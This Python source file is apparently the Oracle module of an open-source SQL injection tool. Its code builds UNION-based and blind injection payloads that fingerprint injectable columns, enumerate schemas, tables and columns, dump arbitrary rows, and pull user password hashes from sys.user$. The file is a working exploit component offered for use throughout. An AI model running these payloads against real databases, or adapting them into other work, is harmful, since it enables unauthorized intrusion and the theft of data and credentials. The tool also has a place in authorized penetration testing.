#!/usr/bin/python3
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.
#
# Developed by: Nasel(http://www.nasel.com.ar)
#
# Authors:
# Matías Fontanini
# Santiago Alessandri
# Gastón Traberg

from . import DbmsMole, FingerBase

class OracleMole(DbmsMole):
    out_delimiter_result = "::-::"
    out_delimiter = DbmsMole.chr_join(out_delimiter_result)
    inner_delimiter = DbmsMole.chr_join(DbmsMole.inner_delimiter_result)
    integer_field_finger = 'ascii(chr(58)) + (length(' + DbmsMole.chr_join("1111111") + ') * 190) + (ascii(chr(73)) * 31337)'
    integer_field_finger_result = '2288989'
    integer_out_delimiter = '3133707'
    comment_list = ['--', '/*', ' ']

    def _schemas_query_info(self):
        return {
            'table' : '(select distinct(owner) as t from all_tables)',
            'field' : ['t']
        }

    def _tables_query_info(self, db):
        return {
            'table' : 'all_tables',
            'field' : ['table_name'],
            'filter': "owner = '{db}'".format(db=db)
        }

    def _columns_query_info(self, db, table):
        return {
            'table' : 'all_tab_columns ',
            'field' : ['column_name'],
            'filter': "owner = '{db}' and table_name = '{table}'".format(db=db, table=table)
        }

    def _fields_query_info(self, fields, db, table, where):
        return {
            'table' : db + '.' + table,
            'field' : fields,
            'filter': where
        }

    def _dbinfo_query_info(self):
        return {
            'field' : ['user', 'banner', 'ora_database_name'],
            'table' : 'v$version'
        }

    def _user_creds_query_info(self):
        return {
            'field'  : ['name', 'password'],
            'table'  : 'sys.user$',
            'filter' : 'type# = 1'
        }
    @classmethod
    def dbms_name(cls):
        return 'Oracle'

    @classmethod
    def dbms_check_blind_query(cls):
        return ' and 0 < (select cast(length(user) as varchar2(100)) from dual)'

    @classmethod
    def injectable_field_fingers(cls, query_columns, base):
        output = []
        integer_output = []
        for i in range(query_columns):
            hashes = list(map(lambda x: 'null', range(query_columns)))
            to_search = list(map(lambda x: '3rr_NO!', range(query_columns)))
            to_search[i] = str(base + i)
            hashes[i] = '(cast (' + str(base + i) + ' as varchar2(150)))'
            output.append(FingerBase(list(hashes), to_search))
            hashes[i] = str(base + i)
            integer_output.append(FingerBase(hashes, to_search, False))
        return output + integer_output

    @classmethod
    def field_finger_query(cls, columns, finger, injectable_field):
        query = " and 1 = 0 UNION ALL SELECT "
        query_list = list(finger._query)
        if finger.is_string_query:
            query_list[injectable_field] = '(user||' + DbmsMole.chr_join(DbmsMole.field_finger_str) + ')'
        else:
            query_list[injectable_field] = '(' + OracleMole.integer_field_finger + ')'
        query += ",".join(query_list) + ' from dual'
        return query

    @classmethod
    def field_finger_trailer(cls):
        return ' from dual'

    def set_good_finger(self, finger):
        self.finger = finger

    def to_string(self, data):
        return DbmsMole.chr_join(data)

    @classmethod
    def field_finger(cls, finger):
        if finger.is_string_query:
            return DbmsMole.field_finger_str
        else:
            return OracleMole.integer_field_finger_result


    def forge_count_query(self, fields, table_name, injectable_field, where="1=1"):
        query = " and 1=0 UNION ALL SELECT "
        query_list = list(self.finger._query)
        query_list[injectable_field] = OracleMole.out_delimiter + '||cast(count(*) as varchar2(150))||' + OracleMole.out_delimiter
        query += ','.join(query_list)
        query += ' from ' + table_name + ' where ' + self.parse_condition(where)
        return query

    def forge_query(self, fields, table_name, injectable_field, where="1=1", offset=0):
        query = " and 1=0 UNION ALL SELECT "
        query_list = list(self.finger._query)
        query_list[injectable_field] = ("(" +
                                            OracleMole.out_delimiter +
                                            "||(" +
                                                ('||' + OracleMole.inner_delimiter + '||').join(map(lambda x: 'coalesce(cast(' + x + ' as varchar2(100)), chr(32))', fields)) +
                                            ")||" +
                                            OracleMole.out_delimiter +
                                        ")")
        query += ','.join(query_list)
        query += " from (select rownum r, " + ','.join(fields) + ' from ' + table_name + " where " + self.parse_condition(where) + ')'
        query += " where r = " + str(offset + 1)
        return query

    def forge_integer_count_query(self, fields, table_name, injectable_field, where="1=1"):
        query = " and 1=0 UNION ALL SELECT "
        query_list = list(self.finger._query)
        query_list[injectable_field] = ('cast(cast(' + OracleMole.integer_out_delimiter +
                                       ' as varchar(10))||cast(count(*) as varchar(150))||cast(' +
                                       OracleMole.integer_out_delimiter + " as varchar(10)) as number(19))")
        query += ','.join(query_list)
        query += ' from ' + table_name + ' where ' + self.parse_condition(where)
        return query

    def forge_integer_len_query(self, fields, table_name, injectable_field, where="1=1", offset=0):
        query = " and 1=0 UNION ALL SELECT "
        query_list = list(self.finger._query)
        query_list[injectable_field] = ("cast (cast(" +
                                            OracleMole.integer_out_delimiter +
                                            " as varchar(10))||cast(length(" +
                                                ('||' + OracleMole.inner_delimiter + '||').join(map(lambda x: 'coalesce(cast(' + x + ' as varchar2(100)), chr(32))', fields)) +
                                            ") as varchar(30))||cast(" +
                                            OracleMole.integer_out_delimiter +
                                        " as varchar(10)) as number(19))")
        query += ','.join(query_list)
        query += " from (select rownum r, " + ','.join(fields) + ' from ' + table_name + " where " + self.parse_condition(where) + ')'
        query += " where r = " + str(offset + 1)
        return query

    def forge_integer_query(self, index, fields, table_name, injectable_field, where="1=1", offset=0):
        query = " and 1=0 UNION ALL SELECT "
        query_list = list(self.finger._query)
        query_list[injectable_field] = ("cast(cast(" +
                                            OracleMole.integer_out_delimiter +
                                            " as varchar(10))||cast(ascii(substr(" +
                                                ('||' + OracleMole.inner_delimiter + '||').join(map(lambda x: 'coalesce(cast(' + x + ' as varchar2(100)), chr(32))', fields)) +
                                            "," + str(index) + ", 1)) as varchar(50))||cast(" +
                                            OracleMole.integer_out_delimiter +
                                        " as varchar(10)) as number(19))")
        query += ','.join(query_list)
        query += " from (select rownum r, " + ','.join(fields) + ' from ' + table_name + " where " + self.parse_condition(where) + ')'
        query += " where r = " + str(offset + 1)
        return query

    def blind_field_delimiter(self):
        return OracleMole.inner_delimiter_result

    def _concat_fields(self, fields):
        return fields

    def _do_concat_fields(self, fields):
        return ('||' + OracleMole.inner_delimiter + '||').join(map(lambda x: 'coalesce(cast(' + x + ' as varchar(150)),CHR(32))', fields))

    def parse_results(self, url_data):
        if self.finger.is_string_query:
            data_list = url_data.split(OracleMole.out_delimiter_result)
        else:
            data_list = url_data.split(OracleMole.integer_out_delimiter)
        if len(data_list) < 3:
            return None
        data = data_list[1]
        return data.split(OracleMole.inner_delimiter_result)

    def is_string_query(self):
        return self.finger.is_string_query

    def forge_blind_query(self, index, value, fields, table, where="1=1", offset=0):
        return ' and {op_par}' + str(value) + ' < (select ascii(substr(' + self._do_concat_fields(fields) + ', ' + str(index) + ', 1)) from (select rownum r,' + ','.join(fields) + ' from ' + table + ' where ' + self.parse_condition(where) + ') where r = ' + str(offset + 1) + ')'

    def forge_blind_count_query(self, operator, value, table, where="1=1"):
        return ' and {op_par}' + str(value) + ' ' + operator + ' (select count(*)  from ' + table + ' where ' + self.parse_condition(where) + ')'

    def forge_blind_len_query(self, operator, value, fields, table, where="1=1", offset=0):
        return ' and {op_par}' + str(value) + ' ' + operator + ' (select length(' + self._do_concat_fields(fields) + ') from (select rownum r,' + ','.join(fields) + ' from ' + table + ' where ' + self.parse_condition(where) + ') where r = ' + str(offset + 1) + ')'
